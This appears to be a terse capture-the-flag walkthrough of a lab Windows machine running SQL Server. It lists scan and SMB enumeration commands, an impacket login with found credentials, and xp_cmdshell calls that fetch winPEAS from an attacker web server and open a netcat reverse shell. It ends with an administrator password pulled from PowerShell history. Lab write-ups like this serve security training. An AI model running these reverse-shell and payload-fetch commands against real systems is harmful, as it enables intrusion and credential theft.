portscan
nmap -sV -sC  10.129.95.187    
![Screenshot_2022-11-10_20-51-21](https://user-images.githubusercontent.com/117921636/201245029-fecc91d1-8657-4b02-a94b-4d1ea929c8ac.png)

smbclient -N -L \\\\10.129.95.187\\
![smb hack](https://user-images.githubusercontent.com/117921636/201246057-f5358ec9-424f-43a8-b5e6-0847e87b35e9.png)

smbclient -N \\\\10.129.95.187\\    
![smb -N](https://user-images.githubusercontent.com/117921636/201247648-6c206c02-f711-4802-be79-8eb6e1c71e25.png)

dts.config
![dts config](https://user-images.githubusercontent.com/117921636/201248627-0214d329-c584-475b-b566-45b8d2ef5749.png)

/usr/bin/impacket-mssqlclient ARCHETYPE/sql_svc@10.129.95.187 -windows-auth
![impacket1](https://user-images.githubusercontent.com/117921636/201252940-5beb1807-b572-49dc-9933-931caa9f68d9.png)

sudo python3 -m http.server 80  
![port80 server](https://user-images.githubusercontent.com/117921636/201254501-043a1fae-5a08-4cf2-b189-628ef8cfb4d0.png)

nc -lvnp 4444
listening on [any] 4444 ...

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.13 4444"   
nc -lvnp 4444    
![nc -lvnp receive](https://user-images.githubusercontent.com/117921636/201256118-1f41e097-7ebc-45b4-8dab-99cb51de755a.png)
 user.txt    
 ![user txt](https://user-images.githubusercontent.com/117921636/201257417-c086d63e-21b5-4bca-b3a7-d8ca7df638ab.png)

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.13/winPEASx64.exe -outfile winPASx64.exe"      
![impacket-mssqlclient](https://user-images.githubusercontent.com/117921636/201258533-de987891-597f-45dc-8881-1353fa1c5928.png)

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe 10.10.16.13 4444"

winPEASx64.exe  
![winpeasx64](https://user-images.githubusercontent.com/117921636/201262873-64090350-4378-41f3-b49e-0c60ea44e08c.png)


ConsoleHost_history.txt   
![ConsoleHost_history txt](https://user-images.githubusercontent.com/117921636/201263384-b8103848-47e2-412e-a657-f55cda41b5eb.png)

echo "/user:administrator MEGACORP_4dm1nping 10.129.95.187" > admin.txt

![root get](https://user-images.githubusercontent.com/117921636/201265565-776e430a-dfbd-4f94-94c8-9b124977cda9.png)

![root](https://user-images.githubusercontent.com/117921636/201265577-8f9a8cd4-f160-41d0-8c9e-c6eafdd554b6.png)

